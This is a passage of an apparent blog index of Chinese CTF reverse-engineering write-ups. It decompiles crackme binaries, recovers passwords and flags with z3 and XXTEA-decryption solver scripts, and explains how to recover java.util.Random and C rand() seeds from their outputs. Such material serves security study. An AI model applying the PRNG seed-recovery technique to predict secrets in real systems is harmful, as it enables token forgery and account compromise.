[]\nrand.append(0x5664ad74)\nrand.append(0x283e9d1a)\nrand.append(0x6ee9f96c)\nrand.append(0x36fc1ff)\nrand.append(0x665b8a42)\npassword = []\nfor i in range(len(rpassword)):\n    password.append(rpassword[i] + rand[i])\n    print(hex(password[i]))\n\n\n但这里还是要注意处理小端数的问题\nimport binascii\n\npassword = [\"6d59386a\",\"48497736\",\"72616e30\",\"63335034\",\"71484537\"]\n\ndef big_small_end_convert(data):\n    return binascii.hexlify(binascii.unhexlify(data)[::-1])\n\ndi = b'6d59386a'\ndo = big_small_end_convert(di)\nprint(do)\ndi = b'48497736'\ndo = big_small_end_convert(di)\nprint(do)\ndi = b'72616e30'\ndo = big_small_end_convert(di)\nprint(do)\ndi = b'63335034'\ndo = big_small_end_convert(di)\nprint(do)\ndi = b'71484537'\ndo = big_small_end_convert(di)\nprint(do)\n\n输出得到正常password串（这个代码有点笨，以后还得改一改）\n6a38596d36774948306e61723450336337454871\n\n将获得的password转成字符\ni = \"6a38596d36774948306e61723450336337454871\"\nfor q in range(0, len(i), 2):\n    flag += chr(int(i[q:q+2], 16))\n#j8Ym6wIH0nar4P3c7EHq\n\n至此用户名和密码就都搞到手了\nusername:itsmebrother\npassword:j8Ym6wIH0nar4P3c7EHq\n\n5.第五个函数分析：int __fastcall sub_400C23(__int64 username, __int64 password)\n&#123;\n  int i; // [rsp+1Ch] [rbp-4h]\n\n  printf(\"flag is:flag&#123;\");\n  for ( i = 0; i &lt;= 19; ++i )\n    putchar(byte_602090[i] ^ *(_BYTE *)(i + password));\n  return puts(\"&#125;\");\n&#125;\n\nflag的值为password异或byte_602090 里的值，将byte_602090 里的值提取出来就可以写exp了。\nEXP为：\nrflag = [0x06,0x57,0x3E,0x0A,0x53,0x13,0x16,0x21,0x5E,0x31,0x0C,0x0B,0x6B,0x22,0x56,0x15,0x52,0x37,0x3B,0x14]\npassword = \"j8Ym6wIH0nar4P3c7EHq\"\nflag = \"\"\nfor i in range(len(rflag)):\n    flag+=chr(ord(password[i]) ^ rflag[i])\nprint(flag)\n\n\nflag{logged_in_my_reverse}\n\n","slug":"Reverse/伪随机数逆向题实例","date":"2022-03-25T07:15:01.000Z","categories_index":"Reverse","tags_index":"WP","author_index":"Big Devils"},{"id":"b987f7dbe9c05bec0f7dc95b74539bc9","title":"伪随机数的逆向中的应用","content":"1.伪随机数介绍：1.伪随机数的运行机制：假设有a1=f(seed) ，an+1=f(an)，那么就可以得到一个序列a1，a2，a3...an 制作一个伪随机数也就是让其每次返回序列的下一个元素，如图：\n\n对于java.utiol.Random，比较老的C语言的rand()库，和一部分php的rand()，它们使用的就是这种线性的随机数方法。这种方法一开始一般会取一个48bit的值作为seed直接放到state0里，而每个新的state的产生方式则为： next_state=(state * multiplier + addend) mod (2 ^ precision) （state为老的state，后面三个为固定的常量(multiplier&#x3D;25214903917,addend &#x3D; 11,precision &#x3D; 48)）。而从state计算到output的过程如下图：\n\noutput：为原数据右移16位之后的32比特的数据\n2.C语言中的随机数函数：(rand,srand)rand和srand是用于产生伪随机数的两个函数，其返回值为[0,RAND_MAX]之间的数据\n1.rand函数：rand()函数是使用线性同余法做的，它并不是真的随机数，因为其周期特别长，所以在一定范围内可以看成随机的。\nint rand(void)\n头文件: stdlib.h\n用户未设定随机数种子时，系统默认的随机数种子为1。\nrand()产生的是伪随机数字，每次执行时是相同的;若要不同,用函数srand()初始化它。\n\n2.srand函数：srand()为初始化随机数发生器，用于设置rand()产生随机数时的种子\nvoid srand(unsigned int seed)\n头文件: stdlib.h\n功能：初始化随机数发生器\nsrand()用来设置rand()产生随机数时的随机数种子。\n参数seed必须是个整数，如果每次seed都设相同值，rand()所产生的随机数值每次就会一样。\n\n\ntips\n一般为了srand值相同导致的产生随机数值相同，随机数种子考虑使用时间(srand(time(NULL)))\n\n\n2.关于随机数的攻击方式：对于随机的攻击来说可以分为两种情况考虑，一种是可以通过逆向算法来获取到随机数的情况，另一种是只能得到生成的随机数，需要想办法逆推出种子的情况。\n情况一：根据算法推出种子这种情况基本就是看它的随机数是怎么得出来的，目前见过的都是建立方程组然后用z3约束器求解\n情况二：根据生成的随机数推出种子ATTACK1：当我们能够获得两个连续的output时：\n\n假设获得到的output为0和1，state0右移十六位得出out0，state1右移十六位得出out1，设state的右16位为x，可设立方程out0&lt;&lt;16+x=state0 ，将这个带着x的state0做线性变换就可以得出state1，再将带着x的state1右移16位则得到了out1,。通过建立方程得出state0后就可以得出所有的state(这里可能会有疑问明明是一元一次方程为啥还需要知道state1，因为右移的操作可能会导致有多个x的值加上左移16位后的out0等于state0，为了确定是哪个所以需要state1)\nRandom random = new Random();\nlong v1 = random.nextlnt();\nlong v2 = random.nextlnt();\nfor (int i = 0;i &lt; 65535;i++)\n&#123;\n\tlong state = v1 * 65535 + i;\n\tif (((state * multiplier + addend)&amp; mask) >>> 16) == v2&#123;\n\t\tSystem.out.println(\"Seed found:\" + state);\n\t\tbreak;\n\t&#125;\n&#125;\n\n\nmultiplier &#x3D; 25214903917\naddend &#x3D; 11\nnext_state &#x3D; (state  * multiplier + addend) &amp; 0xFFFFFFFFFFFF\noutout &#x3D; state &gt;&gt; 16\n\n","slug":"Reverse/伪随机数的逆向中的应用","date":"2022-03-21T14:33:28.000Z","categories_index":"Reverse","tags_index":"C","author_index":"Big Devils"},{"id":"e2d2041f6fdd1685a23cfbc4b3d5e45d","title":"z3约束器在逆向中的应用","content":"ISCC 2018 My math is bad考点：rand，z3\n1.基本信息探查：1.EXEinfo：64位，无壳，ELF文件\n2.运行一下：\n2.ida分析：查看主函数：__int64 __fastcall main(int a1, char **a2, char **a3)\n&#123;\n  puts(\"=======================================\");\n  puts(\"= Welcome to the flag access machine! =\");\n  puts(\"=   Input the password to login ...   =\");\n  puts(\"=======================================\");\n  __isoc99_scanf(\"%s\", s);\n  if ( (unsigned int)sub_400766(s) )\n  &#123;\n    puts(\"Congratulations! You should get the flag...\");\n    sub_400B16(s);\n  &#125;\n  else\n  &#123;\n    puts(\"Wrong password!\");\n  &#125;\n  return 0LL;\n&#125;\n\n主函数的逻辑很清晰，scanf接受值，然后if里调用一个函数，根据返回值判断输入Congratulations!或者Wrong。可以看到如果判断成功还会调用一个函数，函数里面是异或并且输出flag。\n子函数分析：__int64 __fastcall sub_400766(const char *a1)\n&#123;\n  __int64 result; // rax\n  __int64 v2; // [rsp+20h] [rbp-60h]\n  __int64 v3; // [rsp+28h] [rbp-58h]\n  __int64 v4; // [rsp+30h] [rbp-50h]\n  __int64 v5; // [rsp+38h] [rbp-48h]\n  __int64 v6; // [rsp+40h] [rbp-40h]\n  __int64 v7; // [rsp+48h] [rbp-38h]\n  __int64 v8; // [rsp+50h] [rbp-30h]\n  __int64 v9; // [rsp+58h] [rbp-28h]\n  __int64 v10; // [rsp+60h] [rbp-20h]\n  __int64 v11; // [rsp+68h] [rbp-18h]\n  __int64 v12; // [rsp+70h] [rbp-10h]\n  __int64 v13; // [rsp+78h] [rbp-8h]\n\n  if ( strlen(s) != 32 )\n    return 0LL;\n  v2 = a;\n  v3 = b;\n  v4 = c;\n  v5 = d;\n  if ( x * (__int64)*(int *)s - y * (__int64)z != 2652042832920173142LL )\n    goto LABEL_12;\n  if ( 3LL * z + 4LL * y - x - 2LL * *(int *)s != 397958918 )\n    goto LABEL_12;\n  if ( 3 * *(int *)s * (__int64)y - z * (__int64)x != 3345692380376715070LL )\n    goto LABEL_12;\n  if ( 27LL * x + *(int *)s - 11LL * y - z != 40179413815LL )\n    goto LABEL_12;\n  srand(z ^ x ^ *(_DWORD *)s ^ y);\n  v6 = rand() % 50;\n  v7 = rand() % 50;\n  v8 = rand() % 50;\n  v9 = rand() % 50;\n  v10 = rand() % 50;\n  v11 = rand() % 50;\n  v12 = rand() % 50;\n  v13 = rand() % 50;\n  if ( v5 * v7 + v2 * v6 - v3 - v4 != 0xE638C96D3LL )\n    goto LABEL_12;\n  if ( v5 + v2 + v4 * v9 - v3 * v8 == 0xB59F2D0CBLL\n    &amp;&amp; v2 * v10 + v3 * v11 - v4 - v5 == 0xDCFE88C6DLL\n    &amp;&amp; v4 * v13 + v2 - v3 - v5 * v12 == 0xC076D98BBLL )\n  &#123;\n    result = 1LL;\n  &#125;\n  else\n  &#123;\nLABEL_12:\n    result = 0LL;\n  &#125;\n  return result;\n&#125;\n\n函数显示判断输入字符串的长度是否为32,然后与另外三个值进行一些算数运算后看是否等于四个不同的常数，看到这的时候有个疑问，这个判断只用到了输入字符串的前32位，后面的没有用到，这里跟踪到数据段就可以解开异或\n\ns确实只用到了四个字节但这个地址是连续的，而之前判断过输入字串的串长为32位也就是说要想知道输入还需要得到x,z,y,a,b,c,d。(注意排列顺序不是xyz)\n1.求解x，z，y：\n四个if判断后紧接着就是设置随机数的种子，这里用到了也是之前if判断的三个值和输入的字符串，srand函数是个关键，它决定了后面一大串随机数值的生成，这里需要得出随机数的种子值：(简化一下这四个if判断)\nx * (__int64)*(int *)s - y * (__int64)z != 0x24CDF2E7C953DA56LL\n3LL * z + 4LL * y - x - 2LL * *(int *)s != 0x17B85F06\n3 * *(int *)s * (__int64)y - z * (__int64)x != 0x2E6E497E6415CF3ELL\n27LL * x + *(int *)s - 11LL * y - z != 0x95AE13337LL\n\n这一看就得构造一个四元一次方程，使用z3模块编写脚本：\nfrom z3 import *\nx = Int('x')     #x\ny = Int('y')     #y\nz = Int('z')     #z\nf = Int('f')     #s\ns = Solver()\ns.add(x * f - y * z == 2652042832920173142)\ns.add(3 * z + 4 * y - x - 2 * f == 397958918)\ns.add(3 * f * y - z * x == 3345692380376715070)\ns.add(27 * x + f - 11 * y - z == 40179413815)\nif s.check() == sat:\n    result = s.model()\n    print (result)\nelse:\n    print('no result')\n\n输出结果为：\n[x = 1801073242, y = 862734414, z = 829124174, f = 1869639009]\n\n然后计算srand的值：\nx = 1801073242\ny = 862734414\nz = 829124174\nf = 1869639009\nprint(x ^ y ^ z ^ f)\n#103643451\n\n2.求解a，b，c，d：\nsrand(z ^ x ^ *(_DWORD *)s ^ y);\n v6 = rand() % 50;\n v7 = rand() % 50;\n v8 = rand() % 50;\n v9 = rand() % 50;\n v10 = rand() % 50;\n v11 = rand() % 50;\n v12 = rand() % 50;\n v13 = rand() % 50;\n if ( v5 * v7 + v2 * v6 - v3 - v4 != 0xE638C96D3LL )\n   goto LABEL_12;\n if ( v5 + v2 + v4 * v9 - v3 * v8 == 0xB59F2D0CBLL\n   &amp;&amp; v2 * v10 + v3 * v11 - v4 - v5 == 0xDCFE88C6DLL\n   &amp;&amp; v4 * v13 + v2 - v3 - v5 * v12 == 0xC076D98BBLL )\n\n上一步我们已经拿到了随机数的种子，那么现在对于我们来说未知数就只有v2，v3，v4，v5了，下面先将v6到v13get。\n转到linux系统生成rand函数(在随机数那篇笔记有提到为啥不用Windows):\n#include\"stdio.h\"\n#include\"stdlib.h\"\nint main()\n&#123;\n\tsrand(103643451);\n\tprintf(\"v6=%d\\\\n\",rand()%50);\n\tprintf(\"V7=%d\\\\n\",rand()%50);\n\tprintf(\"v8=%d\\\\n\",rand()%50);\n\tprintf(\"v9=%d\\\\n\",rand()%50);\n\tprintf(\"v10=%d\\\\n\",rand()%50);\n\tprintf(\"v11=%d\\\\n\",rand()%50);\n\tprintf(\"v12=%d\\\\n\",rand()%50);\n\tprintf(\"v13=%d\\\\n\",rand()%50);\n\treturn 0;\n&#125;\n\n程序运行结果为：\nq@ubuntu:~/Desktop$ gcc -o test_rand test_rand.c \nq@ubuntu:~/Desktop$ ./test_rand \nv6=22\nV7=39\nv8=45\nv9=45\nv10=35\nv11=41\nv12=13\nv13=36\n\n现在就可以列方程求解四元一次方程了：\nfrom z3 import *\na = Int('a')     #v2\nb = Int('b')     #v3\nc = Int('c')     #v4\nd = Int('d')     #v5\ns = Solver()\ns.add(d * 39 + a * 22 - b - c == 61799700179)\ns.add(d + a + c * 45 - b * 45 == 48753725643)\ns.add(a * 35 + b * 41 - c - d == 59322698861)\ns.add(c * 36 + a - b - d * 13 == 51664230587)\nif s.check() == sat:\n    result = s.model()\n    print (result)\nelse:\n    print('no result')\n\n运行结果为：\na = 811816014,b = 828593230, c = 1867395930, d = 1195788129\n\n至此输入的字串的值就全到手了，将它排列好：\n1869639009,1801073242,829124174,862734414,811816014,828593230,1867395930,1195788129\n\n使用python的libnum 库将数字串转换成字符串：\n#/usr/bin/env python\n# coding=utf-8\nimport libnum\n\nflag = b\"\"\nx = [1869639009,1801073242,829124174,862734414,811816014,828593230,1867395930,1195788129]\nfor y in x:\n    flag+=libnum.n2s(y)[::-1]\nprint(flag)\n#ampoZ2ZkNnk1NHl3NTc0NTc1Z3NoaGFG\n\n输入密码可直接获取flag，另外一个函数就是rand函数与已知值进行异或获得flag，随机数种子就是输入的密码，这里就不进行分析了：\n\nflag{th3_Line@r_4lgebra_1s_d1fficult!}\n","slug":"Reverse/z3约束器在逆向中的应用","date":"2022-03-21T14:22:32.000Z","categories_index":"Reverse","tags_index":"python库,WP","author_index":"Big Devils"},{"id":"e0074d9f1f3fd35e88318f2b9f6e1fe1","title":"z3约束器的使用","content":"Z3约束器1.Z3约束器简介：1.Z3约束器是干啥的？z3是由微软公司开发的一个优秀的SMT求解器，它能够检查逻辑表达式的可满足性，通俗的来讲我们可以简单理解为它是一个解方程的计算器\n\n使用文档\n官方使用文档：&lt;https://rise4fun.com/z3/tutorialcontent/guide>\nZ3 API in PYTHON 中文文档：&lt;https://arabelatso.github.io/2018/06/14/Z3%20API%20in%20Python/>\nz3py 功能手册：&lt;https://z3prover.github.io/api/html/namespacez3py.html>\nz3py 使用文档：&lt;https://ericpony.github.io/z3py-tutorial/guide-examples.htm>\nz3 所使用的语法标准：&lt;http://smtlib.cs.uiowa.edu/papers/smt-lib-reference-v2.6-r2017-07-18.pdf>\n\n2.安装：pip install z3-solver\n\n2.使用教程：1.声明未知数：常见类型：\nInt     #整型\nReal    #实数\nBool    #布尔型\nArray   #数组\nBitVec('a',8)   #char型\n\n其中BitVec可以是特定大小的数据类型，不一定是8，例如C语言中的int型可以用BitVec(‘a’,32)表示\nFor Example：\n声明整数:\nx = Int('x')\n批量声明实数：\na, b, c = Reals('a b c')  #声明3个实数\n\n2.常用API：Solver():改命令会创建一个通用求解器，创建后我们可以添加我们的约束条件，进行下一步的求解\n\nadd():用来添加约束条件，通常在solver()命令之后，添加的约束条件通常是一个逻辑等式\n\ncheck():该函数通常用来判断在添加完约束条件后，来检测解的情况，有解的时候会回显sat，无解的时候会回显unsat\n\nmodel():在存在解的时候，该函数会将每个限制条件所对应的解集的交集，进而得出正解。\n\n3.For Example：对于求解一个方程来说一般可以分为四步：设未知数、列方程、求解方程、得到正解\n假设有方程组：\n30x+15y=675\n12x+5y=265\n\n如果用Z3来解的话：\nfrom z3 import *\nx = Real('x')\ny = Real('y')\ns = Solver()\ns.add(30*x+15*y==675)\ns.add(12*x+5*y==265)\nif s.check() == sat:\n    result = s.model()\n    print (result)\nelse:\n    print('no result')\n\n3.z3解决数学问题：\nfrom z3 import *\ndef func1():\n    x = Real('x')        #x为小李\n    y = Real('y')        #y为小王的哥哥\n    a = Real('a')        #a为小李的弟弟\n    b = Real('b')        #b为小王\n\n    s = Solver()\n    s.add(x - a == 2)\n    s.add(y - b == 2)\n    s.add(y - x == 5)\n    s.add(a + b - 20 - 20 == 15)\n    if s.check()==sat:\n        print (s.model())\n    else:\n       print (\"no result\")\n\nfunc1()\n\n\n未完。\n","slug":"Python/z3约束器的使用","date":"2022-03-21T14:11:13.000Z","categories_index":"Python","tags_index":"python库","author_index":"Big Devils"},{"id":"a8384dcd7abc1e2fe2e53196d43f1b58","title":"XXTEA逆向题实例","content":"Apacha2021HGAME的re\n1.基本信息探查：1.EXEinfo：无壳，64位，ELF文件格式\n\n2.运行一下：输出了一个茶杯，这因该是官方给的一个提示，这个题可能用的是TEA加密\n然后就是输出了一个字符串：“Please input:”\n\n2.IDA分析：1.分析main函数：__int64 __fastcall main(__int64 a1, char **a2, char **a3)\n&#123;\n  _DWORD *v3; // rbx\n  __int64 i; // rax\n  int v6[4]; // [rsp+0h] [rbp-48h] BYREF\n  char v7[40]; // [rsp+10h] [rbp-38h] BYREF\n  unsigned __int64 v8; // [rsp+38h] [rbp-10h]\n\n  v8 = __readfsqword(0x28u);\n  v6[0] = 1;\n  v6[1] = 2;\n  v6[2] = 3;\n  v6[3] = 4;\n  sub_11AA(a1, a2, a3);\n  __printf_chk(1LL, \"Please input: \");\n  __isoc99_scanf(\"%35s\", v7);\n  if ( (unsigned int)strlen(v7) != 35 )\n  &#123;\n    puts(\"wrong length!\");\n    exit(0);\n  &#125;\n  v3 = malloc(0x8CuLL);\n  for ( i = 0LL; i != 35; ++i )\n    v3[i] = v7[i];\n  sub_1447(v3, 35LL, v6, v7);\n  if ( (unsigned int)sub_1550(v3, 35LL) )\n    puts(\"    :)  Flag is your input.\");\n  else\n    puts(\"    :(  Try again.\");\n  return 0LL;\n&#125;\n\n题目的思路还是很清晰的，接收flag，判断flag长度是否为35，然后在25行调用一个函数进行flag的加密，最后在26行处调用函数进行flag验证。\n\n修改后的主函数\n__int64 __fastcall main(__int64 a1, char **a2, char **a3)\n&#123;\n  _DWORD *copy_from_flag; // rbx\n  __int64 i; // rax\n  int key[4]; // [rsp+0h] [rbp-48h] BYREF\n  char flag[40]; // [rsp+10h] [rbp-38h] BYREF\n  unsigned __int64 v8; // [rsp+38h] [rbp-10h]\n\n  v8 = __readfsqword(0x28u);\n  key[0] = 1;\n  key[1] = 2;\n  key[2] = 3;\n  key[3] = 4;\n  printf_TEA();                                 // 输出运行时看到的茶杯\n  __printf_chk(1LL, \"Please input: \");\n  __isoc99_scanf(\"%35s\", flag);\n  if ( (unsigned int)strlen(flag) != 35 )       // 判断flag串长\n  &#123;\n    puts(\"wrong length!\");\n    exit(0);\n  &#125;\n  copy_from_flag = malloc(0x8CuLL);\n  for ( i = 0LL; i != 35; ++i )\n    copy_from_flag[i] = flag[i];\n  crypto(copy_from_flag, 35, (__int64)key);     // 加密输入的flag\n  if ( (unsigned int)check(copy_from_flag, 35) )// 解密flag\n    puts(\"    :)  Flag is your input.\");\n  else\n    puts(\"    :(  Try again.\");\n  return 0LL;\n&#125;\n\n2.加密函数分析：__int64 __fastcall crypto(_DWORD *a1, int a2, __int64 a3)\n&#123;\n  unsigned int *v4; // r13\n  unsigned int v5; // ecx\n  unsigned int v6; // ebx\n  unsigned int v7; // er9\n  __int64 v8; // r8\n  unsigned __int8 v9; // dl\n  __int64 result; // rax\n\n  v4 = &amp;a1[a2 - 1];\n  v5 = *v4;\n  v6 = 0;\n  do\n  &#123;\n    v6 -= 0x61C88647;\n    v7 = v6 >> 2;\n    if ( a2 == 1 )\n    &#123;\n      v9 = 0;\n    &#125;\n    else\n    &#123;\n      v8 = 0LL;\n      do\n      &#123;\n        v5 = a1[v8] + ((((v5 >> 5) ^ (4 * a1[v8 + 1])) + ((16 * v5) ^ (a1[v8 + 1] >> 3))) ^ ((*(_DWORD *)(a3 + 4LL * (((unsigned __int8)v8 ^ (unsigned __int8)v7) &amp; 3)) ^ v5) + (a1[v8 + 1] ^ v6)));\n        a1[v8++] = v5;\n      &#125;\n      while ( v8 != (unsigned int)(a2 - 2) + 1LL );\n      v9 = a2 - 1;\n    &#125;\n    result = (16 * v5) ^ (*a1 >> 3);\n    v5 = *v4 + (((*(_DWORD *)(a3 + 4LL * ((v9 ^ (unsigned __int8)v7) &amp; 3)) ^ v5) + (*a1 ^ v6)) ^ (((4 * *a1) ^ (v5 >> 5)) + result));\n    *v4 = v5;\n  &#125;\n  while ( v6 != 2654435769 * (52 / a2) - 1253254570 );\n  return result;\n\n一开始看到这玩意儿有点蒙，我主要疑惑的地方有两个，第一处是既然是tea的话一定会有Delta值，但v6处按道理应该是作为sum累加delta但是这里是减等0x61C88647 ，第二处是37的循环，以目前的加密来看不是简单的TEA而是XXTEA，那么这个循环的次数应该是rounds = 6 + 52/n ，结果这里的数可以说是巨大，下面主要分析这两处：\n\n第一处：\n先看v6的类型为unsigned int ，也就是说v6占32位，然而把0x61C88647 放入计算器就可以发现\n\n其实最终存进v6的值就是 0x9E37 79B9\n\n第二处：\n弄懂了第一处，第二处也就好解释了，这里应该要循环7次，而把v6的值代入可以发现正好也是7次\n\n\n下面列出改变变量后的加密函数：\n// len_flag 为 35\n__int64 __fastcall crypto(_DWORD *flag, int len_flag, __int64 a3)\n&#123;\n  unsigned int *v4; // r13\n  unsigned int z; // ecx\n  unsigned int sum; // ebx\n  unsigned int e; // er9\n  __int64 p; // r8\n  unsigned __int8 v9; // dl\n  __int64 result; // rax\n\n  v4 = &amp;flag[len_flag - 1];                     // v4 = &amp;flag[34]\n  z = *v4;                                      // z = flag[n - 1]\n  sum = 0;                                      // sum = 0\n  do\n  &#123;\n    sum -= 1640531527;                          // sum -= 0x61C88647\n    e = sum >> 2;                               // e = sum >> 2\n    if ( len_flag == 1 )\n    &#123;\n      v9 = 0;\n    &#125;\n    else\n    &#123;\n      p = 0LL;                                  // p=0\n      do\n      &#123;                                         // y = flag[p+1]\n        z = flag[p]                             // z = flag[p]+ ((z>>5)^(y&lt;&lt;2))+((y>>3)^(z&lt;&lt;4)) ^ ((key[(p^e)&amp;3]^z)+(y^sum))\n          + ((((z >> 5) ^ (4 * flag[p + 1])) + ((16 * z) ^ (flag[p + 1] >> 3))) ^ ((*(_DWORD *)(a3\n                                                                                              + 4LL\n                                                                                              * (((unsigned __int8)p ^ (unsigned __int8)e) &amp; 3)) ^ z)\n                                                                                 + (flag[p + 1] ^ sum)));// key[(p^e)&amp;3]^z\n        flag[p++] = z;                          // flag[p] = z\n                                                // p++\n      &#125;\n      while ( p != (unsigned int)(len_flag - 2) + 1LL );// while(p!=34)\n      v9 = len_flag - 1;                        // v9 = 34\n    &#125;\n    result = (16 * z) ^ (*flag >> 3);           // ((z&lt;&lt;4)^(*flag>>3))       y = flag[0] = *flag\n    z = *v4                                     // z = flag[n-1]+(((key[(p^e)&amp;3]^z)+(y ^ sum)) ^ ((y&lt;&lt;2)^(z>>5)+((z&lt;&lt;4)^(y>>3)))\n      + (((*(_DWORD *)(a3 + 4LL * ((v9 ^ (unsigned __int8)e) &amp; 3)) ^ z) + (*flag ^ sum)) ^ (((4 * *flag) ^ (z >> 5))\n                                                                                          + result));\n    *v4 = z;                                    // flag[n-1] = z\n  &#125;\n  while ( sum != 2654435769 * (52 / len_flag) - 1253254570 );// 外面是循环7次\n  return result;\n&#125;\n\n现在就差一个加密后的值了，这个值可以去比较函数里面找一找。\n3.check函数分析：__int64 __fastcall check(_DWORD *crypted_flag, int len)\n&#123;\n  unsigned __int64 v2; // rax\n  int v3; // edx\n\n  if ( len &lt;= 0 )\n    return 1LL;\n  if ( *crypted_flag != dword_5020 )\n    return 0LL;\n  v2 = 4LL;\n  while ( v2 != 4LL * (unsigned int)(len - 1) + 4 )// 4 * 34 + 4  35个4\n  &#123;\n    v3 = crypted_flag[v2 / 4];                  // v3 = flag[1]      flag[34]  \n    v2 += 4LL;                                  // v2 = 8\n    if ( v3 != *(_DWORD *)((char *)&amp;unk_501C + v2) )// &amp;unk_501C + 8\n      return 0LL;\n  &#125;\n  return 1LL;\n&#125;\n\n加密后的数据在dword_5020 ，双击过去提取里面的数据。\n3.EXP：#include &lt;stdio.h>\n#include &lt;stdlib.h>\n#define DELTA 0x9e3779b9//0x61C88647\nint main()\n&#123;\n    unsigned int v[] = &#123;0xE74EB323,0xB7A72836,0x59CA6FE2,0X967CC5C1,0XE7802674,0X3D2D54E6,0X8A9D0356,0X99DCC39C,0X7026D8ED,0x6A33FDAD,0xF496550A,0x5C9C6F9E,0x1BE5D04C,0x6723AE17,0x5270A5C2,0xAC42130A,0x84BE67B2,0x705CC779,0x5C513D98,0xFB36DA2D,0x22179645,0x5CE3529D,0XD189E1FB,0XE85BD489,0X73C8D11F,0X54B5C196,0XB67CB490,0X2117E4CA,0X9DE3F994,0X2F5AA1AA,0XA7E801FD,0XC30D6EAB,0X1BADDC9C,0X3453B04A,0X92A406F9&#125;;\n    unsigned int key[] = &#123;1,2,3,4&#125;;\n    unsigned int sum = 0;\n    unsigned int y,z,p,rounds,e;\n    int n = 35;  //\n    int i = 0;\n    rounds = 6 + 52/n;\n    y = v[0];\n    sum = (rounds*DELTA)&amp;0xffffffff;\n     do                 //0x9E3779B9*(52/35)-0x4AB325AA，测试来要循环7次\n     &#123;\n        e = sum >> 2 &amp; 3;\n        for(p=n-1;p>0;p--)    //34次循环\n        &#123;\n            z = v[p-1];\n            v[p] = (v[p] - ((((z>>5)^(y&lt;&lt;2))+((y>>3)^(z&lt;&lt;4))) ^ ((key[(p^e)&amp;3]^z)+(y ^ sum)))) &amp; 0xffffffff;\n            y = v[p];\n        &#125;\n        z = v[n-1];\n        v[0] = (v[0] - (((key[(p^e)&amp;3]^z)+(y ^ sum)) ^ (((y&lt;&lt;2)^(z>>5))+((z&lt;&lt;4)^(y>>3))))) &amp; 0xffffffff;\n        y = v[0];\n        sum = (sum-DELTA)&amp;0xffffffff;\n     &#125;while(--rounds);\n    for(i=0;i&lt;n;i++)\n    &#123;\n        printf(\"%c\",v[i]);\n    &#125;\n    return 0;\n&#125;\n\n\nhgame{l00ks_1ike_y0u_f0Und_th3_t34}\n","slug":"Reverse/XXTEA逆向题实例","date":"2022-03-19T18:00:29.000Z","categories_index":"Reverse","tags_index":"算法实例分析,WP","author_index":"Big Devils"},{"id":"f1880da365bc82a97f263e42062ae6ee","title":"XTEA逆向题实例","content":"GoEncryp2021虎符杯的re\n1.基本信息探查：1.EXEinfo：64位，无壳\n\n2.运行一下：\n2.IDA分析：1.找思路：搜索主函数看到main_main：\nvoid __cdecl main_main()\n&#123;\n  int v0; // edi\n  __int64 v1; // rsi\n  __int64 v2; // r8\n  __int64 v3; // r9\n  __int64 v4; // r8\n  __int64 v5; // r9\n  int v6; // edx\n  __int64 v7; // r8\n  __int64 v8; // r9\n  __int64 v9; // r8\n  __int64 v10; // r9\n  int v11; // edx\n  int v12; // ecx\n  __int64 v13; // r8\n  __int64 v14; // r9\n  unsigned __int64 v15; // rbx\n  int v16; // er8\n  __int64 v17; // r9\n  int v18; // er8\n  __int64 v19; // r9\n  int v20; // esi\n  int v21; // edx\n  int v22; // ecx\n  int v23; // er8\n  __int64 v24; // r9\n  int v25; // edx\n  __int64 v26; // r8\n  __int64 v27; // r9\n  __int64 *v28; // [rsp+8h] [rbp-E0h]\n  __int128 v29; // [rsp+8h] [rbp-E0h]\n  _OWORD *v30; // [rsp+8h] [rbp-E0h]\n  __int64 v31; // [rsp+8h] [rbp-E0h]\n  __int64 v32; // [rsp+10h] [rbp-D8h]\n  __int64 v33; // [rsp+18h] [rbp-D0h]\n  __int64 v34; // [rsp+20h] [rbp-C8h]\n  __int64 v35; // [rsp+50h] [rbp-98h]\n  __int64 v36; // [rsp+58h] [rbp-90h]\n  __int128 v37; // [rsp+60h] [rbp-88h] BYREF\n  __int64 v38; // [rsp+70h] [rbp-78h]\n  __int64 v39; // [rsp+78h] [rbp-70h]\n  __int64 v40; // [rsp+80h] [rbp-68h] BYREF\n  __int64 *v41; // [rsp+88h] [rbp-60h]\n  __int128 v42; // [rsp+90h] [rbp-58h] BYREF\n  __int128 v43; // [rsp+A0h] [rbp-48h] BYREF\n  __int128 v44; // [rsp+B0h] [rbp-38h] BYREF\n  __int128 v45; // [rsp+C0h] [rbp-28h] BYREF\n  __int128 v46; // [rsp+D0h] [rbp-18h] BYREF\n\n  if ( (unsigned __int64)&amp;v40 &lt;= *(_QWORD *)(*(_QWORD *)NtCurrentTeb()->NtTib.ArbitraryUserPointer + 16LL) )\n    runtime_morestack_noctxt();\n  runtime_newobject(v0, v1);\n  v41 = v28;\n  *(_QWORD *)&amp;v46 = &amp;unk_4D4F40;\n  *((_QWORD *)&amp;v46 + 1) = &amp;main_statictmp_0;\n  fmt_Fprintln(\n    v0,\n    v1,\n    (unsigned int)&amp;v46,\n    (unsigned int)&amp;unk_4D4F40,\n    v2,\n    v3,\n    (__int64)&amp;go_itab__os_File_io_Writer,\n    os_Stdout,\n    (__int64)&amp;v46);\n  *(_QWORD *)&amp;v45 = &amp;unk_4D1A80;\n  *((_QWORD *)&amp;v45 + 1) = v41;\n  fmt_Fscanf(\n    v0,\n    v1,\n    (unsigned int)&amp;go_itab__os_File_io_Reader,\n    (unsigned int)&amp;v45,\n    v4,\n    v5,\n    (__int64)&amp;go_itab__os_File_io_Reader,\n    os_Stdin,\n    (__int64)&amp;unk_4FAFCC,\n    2LL,\n    (__int64)&amp;v45,\n    1LL);\n  *(_QWORD *)&amp;v29 = v41[1];\n  main_check(v0, v1, v6, *v41, v7, v8, *v41, v29);\n  if ( v32 )\n  &#123;\n    v36 = v34;\n    v35 = v33;\n    v38 = v32;\n    runtime_newobject(v0, v1);\n    *v30 = main_statictmp_4;\n    v37 = main_statictmp_5;\n    main_NewCipher(v0, v1, v11, v12, v13, v14, (__int64)v30, 16LL);\n    v39 = v33;\n    runtime_newobject(v0, v1);\n    v40 = v31;\n    v15 = v33;\n    main___myCipher__Encrypt(v0, v34, v38, v39, v16, v17, v39, v31, 16LL, 16LL, v38, v33);\n    if ( v15 &lt; 8 )\n      runtime_panicslice();\n    v20 = v38;\n    main___myCipher__Encrypt(\n      v0,\n      v38,\n      v38 + (((8 - v36) >> 63) &amp; 8),\n      v40,\n      v18,\n      v19,\n      v39,\n      v40 + 8,\n      8LL,\n      8LL,\n      v38 + (((8 - v36) >> 63) &amp; 8),\n      v35 - 8);\n    internal_bytealg_Equal(v0, v38, v21, v22, v23, v24, v40, 16, 16LL, (__int64)&amp;v37, 16, 16);\n    if ( 